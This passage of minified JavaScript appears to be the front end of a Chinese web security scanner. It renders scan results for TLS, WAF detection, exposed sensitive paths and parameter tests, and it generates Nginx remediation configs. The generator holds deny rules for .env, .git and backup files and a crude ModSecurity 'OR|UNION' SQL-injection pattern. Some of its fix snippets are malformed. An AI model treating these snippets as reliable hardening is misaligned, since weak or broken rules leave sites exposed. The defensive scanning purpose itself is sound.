PR修复(+10)</p></div>',n+="</div>",e.ssl_info&&e.ssl_info.has_cert){n+='<div class="card fade-in-up" style="animation-delay:0.32s">',n+='<div class="card-title"> SSL 证书信息</div>';let l=e.ssl_info;n+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">',n+='<div><span style="color:var(--text-lighter)">域名:</span> '+E(l.subject||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">签发机构:</span> '+E(l.issuer||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">TLS 版本:</span> '+E(l.version||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">密码套件:</span> '+E(l.cipher||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">剩余天数:</span> '+(l.days_left!=null?l.days_left+" 天":"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">过期时间:</span> '+E(l.not_after||"N/A")+"</div>",l.san&&l.san.length>0&&(n+='<div style="grid-column:1/-1"><span style="color:var(--text-lighter)">SAN:</span> '+E(l.san.join(", "))+"</div>"),n+="</div>",l.expired?n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(199,84,80,0.1);border-radius:2px;color:var(--danger);font-size:12px;font-weight:600">证书已过期！</div>':l.days_left!=null&&l.days_left<30&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">证书将在 '+l.days_left+" 天后过期</div>"),l.weak&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">使用弱加密协议/套件</div>'),n+="</div>"}if(e.waf&&e.waf.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.34s">',n+='<div class="card-title"> WAF 防护检测</div>',n+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">',e.waf.forEach(function(l){n+='<span style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);border-radius:2px;font-size:12px;font-weight:600">'+E(l.name)+"</span>"}),n+="</div>",n+='<div style="padding:8px 12px;background:rgba(59,130,246,0.06);border-radius:2px;font-size:12px;color:var(--text-light);line-height:1.5">',n+="WAF 提供应用层防护，但不能替代 HSTS、CSP、Cookie 安全策略等配置。下方发现的缺失项仍需修复。",n+="</div>",n+="</div>"),e.sensitive_paths&&e.sensitive_paths.length>0){let l=e.sensitive_paths.filter(function($){return $.exposed}),A=e.sensitive_paths.filter(function($){return $.suspect}),J=e.sensitive_paths.filter(function($){return $.info}),N=e.sensitive_paths.filter(function($){return!$.exposed&&!$.suspect&&!$.info});n+='<div class="card fade-in-up" style="animation-delay:0.36s">',n+='<div class="card-title"> 敏感路径探测</div>',l.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--danger);margin-bottom:6px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;border-left:3px solid var(--danger)"> 确认漏洞 ('+l.length+")</div>",n+='<div style="font-size:12px;line-height:2">',l.forEach(function($){n+='<div style="color:var(--danger)">'+E($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span>  已暴露 ("+($.size||"-")+" bytes)</div>"}),n+="</div></div>"),A.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--warning);margin-bottom:6px;padding:4px 8px;background:rgba(240,167,50,0.08);border-radius:2px;border-left:3px solid var(--warning)">疑似风险 ('+A.length+")</div>",n+='<div style="font-size:12px;line-height:2">',A.forEach(function($){n+='<div style="color:var(--warning)">'+E($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span> "+E($.reason||"疑似误报，需人工确认")+"</div>"}),n+="</div></div>"),J.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:#4b6eaf;margin-bottom:6px;padding:4px 8px;background:rgba(59,130,246,0.08);border-radius:2px;border-left:3px solid #4b6eaf">信息： 公开信息 ('+J.length+")</div>",n+='<div style="font-size:12px;line-height:2">',J.forEach(function($){n+='<div style="color:#4b6eaf">'+E($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span> 信息： 公开信息</div>"}),n+="</div></div>"),N.length>0&&(n+='<div style="font-size:12px;line-height:2">',N.forEach(function($){$.protected?n+='<div style="color:var(--success)">'+E($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span>  已保护</div>":n+='<div style="color:var(--text-lighter)">'+E($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span></div>"}),n+="</div>"),n+="</div>"}if(e.crawled_pages&&e.crawled_pages.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.38s">',n+='<div class="card-title"> 爬取页面 ('+e.crawled_pages.length+" 页)</div>",n+='<div style="font-size:12px;line-height:2;max-height:200px;overflow-y:auto">',e.crawled_pages.forEach(function(l){n+='<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border-light)">',n+='<span style="color:'+(l.status===200?"var(--success)":"var(--warning)")+';font-weight:600;min-width:30px">['+l.status+"]</span>",n+='<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+E(l.url)+'">'+E(l.url)+"</span>",l.forms>0&&(n+='<span style="color:var(--warning);font-size:12px">'+l.forms+" 表单</span>"),l.inputs>0&&(n+='<span style="color:var(--primary);font-size:12px">'+l.inputs+" 输入框</span>"),n+="</div>"}),n+="</div></div>"),e.vuln_tests&&e.vuln_tests.length>0){let l=e.vuln_tests.filter(function(J){return J.vulnerable}).length,A=e.vuln_tests.length;n+='<div class="card fade-in-up" style="animation-delay:0.40s">',n+='<div class="card-title"> 参数与表单验证</div>',n+='<div style="display:flex;gap:12px;margin-bottom:10px;font-size:13px">',n+='<span style="color:var(--text-secondary)">检测项总数: <strong>'+A+"</strong></span>",n+='<span style="color:'+(l>0?"var(--danger)":"var(--success)")+'">发现漏洞: <strong>'+l+"</strong></span>",n+="</div>",n+='<div style="font-size:12px;line-height:1.8;max-height:180px;overflow-y:auto">',e.vuln_tests.forEach(function(J){let N=J.vulnerable?"var(--danger)":"var(--text-lighter)",$=(J.vulnerable,"");n+='<div style="color:'+N+';padding:2px 0">',n+=$+" ["+J.type+"] "+E(J.param)+"="+E(J.payload)+" ("+E(J.url.substring(0,50))+"...)</div>"}),n+="</div></div>"}e.scan_type==="deep"&&(n+='<div style="text-align:center;margin:12px 0">',n+='<span style="display:inline-block;padding:4px 14px;background:rgba(75,110,175,0.1);color:var(--primary);border-radius:2px;font-size:12px;font-weight:600">深度扫描模式 - 含参数与表单验证</span>',n+="</div>");let z=e.findings.filter(function(l){return l.owasp==="A05 安全配置错误"||l.owasp==="A02 加密机制失效"||l.name.indexOf("缺少")===0});z.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.42s">',n+='<div class="card-title"> 一键生成修复配置</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px">检测到 '+z.length+" 个配置类问题，可自动生成 Nginx 修复配置。</p>",n+='<div class="fixer-btns">',n+='<button class="fixer-btn primary" onclick="goToFixerWithScanResult()"> 生成修复配置</button>',n+='<div class="report-download-dropdown">',n+='<button class="pdf-download-btn" onclick="toggleReportDropdown()"> 下载报告 <span style="font-size:11px">▼</span></button>',n+='<div class="report-dropdown-menu" id="report-dropdown">',n+=`<div onclick="downloadReport('pdf');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>PDF</span><span>PDF 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">适合打印存档</span>',n+="</div>",n+=`<div onclick="downloadReport('html');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>HTML</span><span>HTML 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">精美可交互</span>',n+="</div>",n+="</div></div>",n+='<button class="fixer-btn success" id="verify-fix-btn" onclick="verifyFix()"> 验证修复效果</button>',n+="</div>",n+="</div>"),n+='<div class="card fade-in-up" style="animation-delay:0.7s;background:#3c3f41,rgba(115,201,144,0.02));border:1px solid rgba(115,201,144,0.2);text-align:center">',n+='<h3 class="card-title" style="color:var(--success)"> 扫描完成</h3>',n+='<p style="color:var(--text-secondary);margin-bottom:16px">将修复配置应用到服务器后，点击下方按钮重新扫描验证效果</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+='<button class="btn btn-primary" onclick="verifyFix()"> 验证修复效果</button>',n+='<button class="btn btn-secondary" onclick="shareResult()"> 分享报告</button>',n+=`<button class="btn btn-secondary" onclick="downloadReport('pdf')"> 下载 PDF</button>`,n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> PDF 报告内容说明</div>',n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">',n+="<div> <strong>风险摘要</strong>：确认漏洞数 / 疑似风险数 / 配置缺失数总览</div>",n+="<div> <strong>证据详情</strong>：每个 finding 的响应头值、敏感路径内容片段、WAF 检测依据</div>",n+="<div> <strong>修复建议</strong>：按服务器类型（Nginx / Apache / Express / Flask / Spring Boot / Cloudflare）分类的修复配置，含优先级排序</div>",n+="<div> <strong>复测结果</strong>：上次 vs 本次分数对比、新增问题 / 已修复问题列表</div>",n+="<div> <strong>评分变化</strong>：如有历史记录，展示分数变化趋势</div>",n+="</div>",n+='<div style="margin-top:10px;text-align:center">',n+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 下载 PDF 报告</button>`,n+="</div>",n+="</div>";let M=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.exposed}).length:0,O=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.suspect}).length:0,j=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.info}).length:0,P=e.findings?e.findings.filter(function(l){return l.name.indexOf("缺少")===0}).length:0,U=e.findings?e.findings.filter(function(l){return l.type==="config"&&l.name.indexOf("缺少")!==0}).length:0,Y=[];if(M>0?Y.push("发现 "+M+" 个确认级敏感文件泄露"):Y.push("未发现确认级敏感文件泄露"),O>0&&Y.push("检测到 "+O+" 个疑似 WAF/登录页响应"),P>0||U>0){let l=P+U;Y.push("另有 "+l+" 项安全响应头/配置缺失")}let S=Y.join("，")+"。";n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> 扫描总评</div>',n+='<div style="font-size:14px;line-height:1.8;font-weight:500">'+E(S)+"</div>",n+='<div style="margin-top:10px;font-size:12px;line-height:2">',M>0&&(n+='<div style="color:var(--danger)"> 确认漏洞：'+M+" 个敏感文件可直接访问，需立即修复</div>"),O>0&&(n+='<div style="color:var(--warning)">疑似风险：'+O+" 个路径返回 200，但内容命中 WAF/登录页/反爬特征，因此不判定为真实泄露，建议人工复测</div>"),j>0&&(n+='<div style="color:var(--primary)">信息： 公开信息：'+j+" 个路径为公开协议文件（如 robots.txt），仅作为信息项展示</div>"),P>0&&(n+='<div style="color:var(--text-secondary)">&#x2022; 配置缺失：'+P+" 个安全响应头未配置</div>"),n+="</div>",e.restricted?(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;line-height:1.6">',n+="<strong>受限扫描提示</strong><br/>",n+="目标站点存在 WAF/反爬/登录限制，本次扫描可能未获取完整信息。建议扫描网站首页或主域名，或联系站点管理员获取授权后进行深度扫描。",n+="</div>"):M===0&&O===0&&(P>0||U>0)&&(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(115,201,144,0.08);border-radius:2px;color:var(--success);font-size:12px">',n+=" 未发现敏感文件泄露，整体风险可控。建议优先补充缺失的安全响应头以提升评分。",n+="</div>"),n+="</div>",(function(){let l="",A="",J=!1,N="",$="",q=!1,te="",B="",C=!1,ee=e.findings.some(function(ne){return ne.type==="exposed"||ne.name&&ne.name.indexOf("敏感路径")>=0}),K=e.findings.some(function(ne){return ne.severity==="high"&&ne.name&&(ne.name.indexOf("HSTS")>=0||ne.name.indexOf("CSP")>=0)}),V=e.findings.some(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.type==="config"}),fe=e.findings.some(function(ne){return ne.name&&ne.name.indexOf("Server")>=0}),re=e.findings.filter(function(ne){return ne.severity==="high"&&ne.name&&ne.name.indexOf("缺少")===0}),ae=e.findings.filter(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.name&&ne.name.indexOf("缺少")===0});if(ee?(l="修复 exposed 敏感路径（限制 .env/.git 等文件访问）",A="预计提升 20 分",J=!1):K?(l="修复 high severity 响应头缺失（CSP / HSTS）",A="预计提升 15 分",J=!1):(l="无紧急暴露路径，响应头配置良好",A="保持当前状态",J=!0),V||fe||ae.length>0){let ne=[];ae.length>0&&ne.push("补充 "+ae.length+" 个 medium/low 响应头"),fe&&ne.push("隐藏 Server 版本信息"),N=ne.join(" + ")||"检查并优化配置项",$="预计提升 8 分",q=!1}else N="medium/low 配置已完善，Server 信息已隐藏",$="无需操作",q=!0;te="生成修复配置后重新扫描，确认分数提升",B="验证闭环",C=J&&q;let oe=function(ne){return ne?'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 已完成</span>':'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 未开始</span>'};n+='<div class="card fade-in-up" style="animation-delay:0.75s;background:#3c3f41,rgba(16,185,129,0.04));border:1px solid rgba(115,201,144,0.2)">',n+='<div class="card-title"> 修复优先级路线</div>',n+='<div style="display:flex;flex-direction:column;gap:10px">',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">1. 第一步（立即）</strong>',n+=oe(J),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+l+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+A+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">2. 第二步（今天）</strong>',n+=oe(q),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+N+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+$+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">3. 第三步（复测）</strong>',n+=oe(C),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+te+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+B+"</div>",n+="</div>",n+="</div></div>"})(),n+='<div style="margin-top:20px;padding:16px;background:var(--bg-secondary);border-radius:2px;font-size:12px;color:var(--text-secondary)">',n+='<div style="font-weight:600;margin-bottom:8px">检测范围说明</div>',n+="<div>本次扫描检测了：HTTPS/TLS 配置、安全响应头（HSTS/CSP/X-Frame-Options 等 15+ 项）、Cookie 安全属性、CORS 策略、敏感路径暴露、WAF 识别。</div>",n+='<div style="margin-top:4px">不进行：破坏性攻击、密码爆破、权限绕过、主动利用和深度渗透测试。</div>',n+='<div style="margin-top:4px;color:var(--text-light)">如需全面安全评估，建议配合专业安全服务。</div>',n+='<div style="margin-top:8px;font-weight:600">如何验证结果</div>',n+="<div>每个发现项都附有请求、响应、命中签名和摘要信息。你可以先看证据摘要，再结合二次扫描结果和原始响应确认；复测后重新扫描，对比评分和证据变化即可验证效果。</div>",n+='<div style="margin-top:8px;font-weight:600">证据分层</div>',n+="<div>「已验证」表示已完成交叉验证或用户确认；「可能存在」表示有较强线索但建议人工复测；「待复测」表示证据较弱或不完整，建议先复测再进入工单。</div>",n+='<div style="margin-top:8px;font-weight:600">审计范围</div>',n+="<div>本报告覆盖 HTTP/TLS 配置、安全响应头、Cookie 标记、CORS、敏感路径和 WAF 识别，不包含破坏性利用或深度渗透动作。</div>",n+='<div style="margin-top:8px;font-weight:600">免责声明</div>',n+="<div>本报告由漏洞哨兵自动生成，仅反映扫描时刻的目标配置状况，可用于演示、内测和修复跟踪，不构成完整安全审计结论。</div>",n+="</div>";let H=document.getElementById("result-content");if(!H){console.warn("renderResult: result-content element not found");return}H.innerHTML=n,Vi(e),Xi(e.score)}catch(i){console.error("renderResult error:",i);let t=document.getElementById("result-content");t&&(t.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">!</div><h3 style="color:var(--danger);margin-bottom:8px">报告渲染出错</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在渲染扫描报告时遇到问题，但扫描数据本身是完整的。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+E(i.message||String(i))+'</p><button class="btn btn-primary" onclick="location.reload()"> 刷新页面重试</button></div>')}}function rs(){if(!ce||!ce.redirect_reason){F("无法识别跳转目标地址");return}let i=ce.redirect_reason.match(/https?:\/\/[^\s\)]+/);if(i&&i[0]){let t=i[0],r=document.getElementById("scan-url");r&&(r.value=t),gi()}else F("无法识别跳转目标地址")}function ss(){if(!ce||!ce.scan_id){F("当前结果暂不支持分享");return}ue("/api/history?limit=1").then(function(e){return e.json()}).then(function(e){let i=(e.history||[])[0];if(!i||!i.share_id){F("分享链接生成失败");return}let t=window.location.origin+"/api/share/"+i.share_id;navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(t).then(function(){F("分享链接已复制到剪贴板")}):prompt("复制以下分享链接：",t)})}function os(){let e='<div class="card fade-in-up" style="background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2);text-align:center">';e+='<div style="font-size:18px;margin-bottom:8px"></div>',e+='<div style="font-size:15px;font-weight:700;margin-bottom:6px">PDF 报告已生成</div>',e+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">',e+="报告包含以下内容：<br>",e+=" 风险摘要（确认漏洞 / 疑似风险 / 配置缺失）<br>",e+=" 证据详情（响应头值、敏感路径片段、WAF 检测依据）<br>",e+=" 修复建议（按服务器类型分类，含优先级排序）<br>",e+=" 复测结果（上次 vs 本次分数对比、新增 / 已修复问题）<br>",e+=" 评分变化趋势（如有历史记录）",e+="</div>",e+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 立即下载 PDF</button>`,e+="</div>";let i=document.getElementById("result-content");i&&i.insertAdjacentHTML("afterbegin",e)}function as(e){an(e)}function an(e){document.querySelectorAll(".result-list-item").forEach(function(r){r.classList.remove("active")});let i=document.getElementById("finding-list-"+e);i&&i.classList.add("active"),document.querySelectorAll(".finding-detail").forEach(function(r){r.classList.remove("active")});let t=document.getElementById("finding-detail-"+e);t&&t.classList.add("active")}function ls(){ge("gen-fix-btn",!0);try{if(!ce){ge("gen-fix-btn",!1);return}let e=document.getElementById("gen-fix-input"),i=document.getElementById("gen-fix-output");if(!e||!i){ge("gen-fix-btn",!1);return}let t=e.value.trim();if(!t){i.innerHTML='<div style="color:var(--warning);font-size:13px;margin-top:8px">请输入 Nginx 配置内容</div>',ge("gen-fix-btn",!1);return}let r=ds(ce.findings,t);i.innerHTML='<div style="margin-top:14px"><div class="finding-section"><h4>复测后配置</h4><div class="code-block">'+E(r.fixed)+`</div></div><div class="fixer-btns" style="margin-top:10px"><button class="fixer-btn success" onclick="copyText(this, '`+btoa(encodeURIComponent(r.fixed))+`')"> 复制配置</button></div></div>`}catch(e){console.error("generateFixFromResult error:",e);let i=document.getElementById("gen-fix-output");i&&(i.innerHTML='<div style="color:var(--danger);font-size:13px;margin-top:8px">错误： 生成失败：'+E(e.message||String(e))+"</div>")}finally{ge("gen-fix-btn",!1)}}function ds(e,i){try{Array.isArray(e)||(e=[]),typeof i!="string"&&(i="");let t=i,r=/server\s*\{/.test(t);r||(t=`server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.html;

`);let s=[],o=[];if(e.forEach(function(a){let n=a.name||"",c=a.type||"config",g=a.fix||"";n.indexOf("缺少 ")===0&&(n.indexOf("HSTS")>=0||n.indexOf("CSP")>=0||n.indexOf("X-Frame")>=0||n.indexOf("X-Content")>=0||n.indexOf("Referrer")>=0||n.indexOf("Permissions")>=0)?g&&s.push(g):n.indexOf("敏感路径")>=0||n.indexOf("敏感文件")>=0?o.push(`location ~ /(\\.env|\\.git|.*\\.sql|.*\\.zip|.*\\.bak) {
    deny all;
    return 403;
}`):n.indexOf("信息泄露")>=0||n.indexOf("Server")>=0?s.push("server_tokens off;"):n.indexOf("Cookie")>=0?s.push("proxy_cookie_path / /; HttpOnly; Secure; SameSite=Strict;"):n.indexOf("CORS")>=0?s.push("add_header Access-Control-Allow-Origin 'https://your-domain.com' always;"):c==="XSS"&&g?s.push(`add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;`):c==="SQLi"&&g&&o.push('# ModSecurity: SecRule ARGS "(OR|UNION)" "deny,status:403"')}),s.length>0||o.length>0)if(r){let a=t.lastIndexOf("}"),n=t.substring(0,a),c=t.substring(a);s.length>0&&(n+=`
    # === 安全响应头（由漏洞哨兵生成） ===
`,s.forEach(function(g){g.split(`
`).forEach(function(d){d.trim()&&(n+="    "+d.trim()+`
`)})})),o.length>0&&(n+=`
    # === 拦截规则（由漏洞哨兵生成） ===
`,o.forEach(function(g){n+="    "+g+`
`})),t=n+c}else s.forEach(function(a){t+=a+`
`}),o.forEach(function(a){t+=a+`
`}),t+=`}
`;return{fixed:t}}catch(t){return console.error("generateFixFromFindings error:",t),{fixed:i||"",error:t.message||String(t)}}}function cs(){if(!ce){F("请先完成扫描");return}ge("goto-fixer-btn",!0),_e("fixer"),F("正在生成修复方案...");let e=ce.url;ue("/api/fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(i){return i.json()}).then(function(i){if(ge("goto-fixer-btn",!1),i.success)De=i.fixes,ni(i.fixes,i.score);else{let t=document.getElementById("fixer-result");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">生成失败: '+E(Ne(i))+"</p></div>")}}).catch(function(i){ge("goto-fixer-btn",!1);let t=ln(ce.findings);De=t,ni(t,ce.score)})}function ln(e){try{Array.isArray(e)||(e=[]);let i={nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]};return e.forEach(function(t){let r=t.fix||"";r&&(i.nginx.push(r),i.apache.push(r.replace("add_header","Header set").replace("always;","")),i.express.push("// "+t.name+": "+r.substring(0,60)),i.flask.push("# "+t.name+": "+r.substring(0,60)),i.spring_boot.push("// "+t.name+": "+r.substring(0,60)),i.cloudflare.push("# "+t.name+": "+r.substring(0,60)),i.python.push("# "+t.name+": "+r.substring(0,60)),i.nodejs.push("// "+t.name+": "+r.substring(0,60)))}),i}catch(i){return console.error("generateLocalFixes error:",i),{nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]}}}function ni(e,i){try{(!e||typeof e!="object")&&(e={nginx:[],python:[],nodejs:[],apache:[]});let t=document.getElementById("fixer-scan-prompt"),r=document.getElementById("fixer-lang-tabs"),s=document.getElementById("fixer-result");if(t&&(t.style.display="none"),r&&(r.style.display="block"),!s)return;let o="",a={nginx:"Nginx",python:"Python (Flask)",nodejs:"Node.js (Express)",apache:"Apache"},n={nginx:"",python:"",nodejs:"",apache:""},c=Zi,g=e[c]||[];if(o+='<div class="card fade-in-up">',o+='<div class="card-title">'+n[c]+" "+a[c]+" 修复代码</div>",o+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:10px">共 '+g.length+" 条修复建议，评分: "+(typeof i=="number"&&!isNaN(i)?i:0)+"</div>",g.length===0)o+='<p style="color:var(--success);font-size:13px"> 未检测到需要修复的配置问题</p>';else{let v=g.map(function(d){return typeof d=="string"?d:d&&typeof d=="object"?d.code||"":String(d)}).join(`

`);o+='<div class="code-block" style="max-height:400px;overflow-y:auto">'+E(v)+"</div>",o+='<div class="fixer-btns" style="margin-top:12px">',o+=`<button class="fixer-btn success" onclick="copyFixCodeByLang('`+c+`')"> 复制代码</button>`,o+=`<button class="fixer-btn primary" onclick="downloadFixCode('`+c+`')"> 下载文件</button>`,o+="</div>"}o+='<div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border-light)">',o+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:8px">其他语言修复方案：</div>',["nginx","python","nodejs","apache"].forEach(function(v){if(v===c)return;let d=(e[v]||[]).length;o+='<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px">',o+="<span>"+n[v]+" "+a[v]+"</span>",o+='<span style="color:var(--text-lighter)">'+d+" 条修复</span>",o+="</div>"}),o+="</div>",o+="</div>",s.innerHTML=o}catch(t){console.error("renderFixResult error:",t);let r=document.getElementById("fixer-result");r&&(r.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复结果失败: '+E(t.message||String(t))+"</p></div>")}}function ps(e){Zi=e,document.querySelectorAll(".lang-tab").forEach(function(i){i.dataset.lang===e?i.className="fixer-btn primary lang-tab active":i.className="fixer-btn secondary lang-tab"}),De&&ni(De,ce?ce.score:0)}function us(e,i){i=i||"fix-",["nginx","apache","express","flask","spring_boot","cloudflare"].forEach(function(r){let s=document.getElementById(i+"tab-"+r),o=document.getElementById(i+"content-"+r);s&&o&&(r===e?(s.style.background="var(--primary)",s.style.color="#fff",s.style.borderColor="var(--primary)",o.style.display="block"):(s.style.background="transparent",s.style.color="var(--text-secondary)",s.style.borderColor="var(--border)",o.style.display="none"))})}function vi(e){return Array.isArray(e)?e.map(function(i){return typeof i=="string"?i:i&&typeof i=="object"?i.code||"":String(i)}).join(`

`):""}function fs(e){if(!De)return;let i=vi(De[e]||[]);ht(i),F("已复制 "+e+" 修复代码")}function gs(e){if(!De)return;let i=vi(De[e]||[]),r="security-fix."+({nginx:"conf",python:"py",nodejs:"js",apache:"conf"}[e]||"txt"),s=new Blob([i],{type:"text/plain"}),o=URL.createObjectURL(s),a=document.createElement("a");a.href=o,a.download=r,document.body.appendChild(a),a.click(),document.body.removeChild(a),URL.revokeObjectURL(o),F("已下载 "+r)}async function hs(){if(!ce){F("请先完成扫描");return}let e=De||ln(ce.findings),i=["nginx","apache","express","flask","spring_boot","cloudflare","python","nodejs"],t=new br,r={product:"Vuln Sentinel",package_type:"repair_configuration_package",target:ce.url||"",generated_at:new Date().toISOString(),generated_at_local:new Date().toLocaleString("zh-CN"),scan_id:ce.scan_id||null,score:typeof ce.score=="number"?ce.score:null,findings:Array.isArray(ce.findings)?ce.findings.length:0,version:"11-S"};t.file("manifest.json",JSON.stringify(r,null,2)),t.file("README.txt",["Vuln Sentinel 修复配置包","目标: "+(ce.url||""),"生成时间: "+new Date().toLocaleString("zh-CN"),"","内容结构:","- manifest.json: 包信息与扫描摘要","- README.txt: 使用说明","- 各平台 .txt: 对应平台的修复片段","","说明:","- 如果某个平台文件为空，表示当前扫描结果暂未生成对应配置","- 请优先查看报告中的漏洞证据和修复说明"].join(`
`));let s=!1;i.forEach(function(c){let g=e&&e[c]?e[c]:[],v=g.length===0?`暂无适用配置片段
`:vi(g)+`
`;g.length>0&&(s=!0),t.file(c+".txt",v)}),s||t.file("USAGE.txt",`当前扫描结果没有直接生成平台配置片段。请先查看报告中的漏洞证据与修复建议，再重新生成修复包。
`);let o=await t.generateAsync({type:"blob"}),a=URL.createObjectURL(o),n=document.createElement("a");n.href=a,n.download="vuln-sentinel-fixes-"+Qe(ce.url)+".zip",document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(a),F("修复配置包已下载")}function vs(){if(!ce){F("请先完成扫描");return}let e=ce.url;if(!e){F("无法获取扫描 URL");return}let i=document.getElementById("verify-fix-btn");i&&(i.disabled=!0,i.textContent="验证中..."),F("正在重新扫描验证修复效果..."),ue("/api/verify-fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(t){if(t.status===402)return t.json().then(function(r){return r._status=402,r});if(!t.ok)throw new Error("API 返回 "+t.status);return t.json()}).then(function(t){if(i&&(i.disabled=!1,i.textContent="验证修复效果"),Dt(t)){F(Rt(t),"error"),Pe();return}if(t.success){let r=ce.score,s=t.new_score,o="重新扫描完成！评分: "+r+" → "+s;s>r?o+=" (提升 "+(s-r)+" 分)":s<r?o+=" (下降 "+(r-s)+" 分)":o+=" (无变化)",F(o);let a=(ce.findings||[]).map(function(v){return v.name}),n=(t.new_findings||[]).map(function(v){return v.name}),c=a.filter(function(v){return 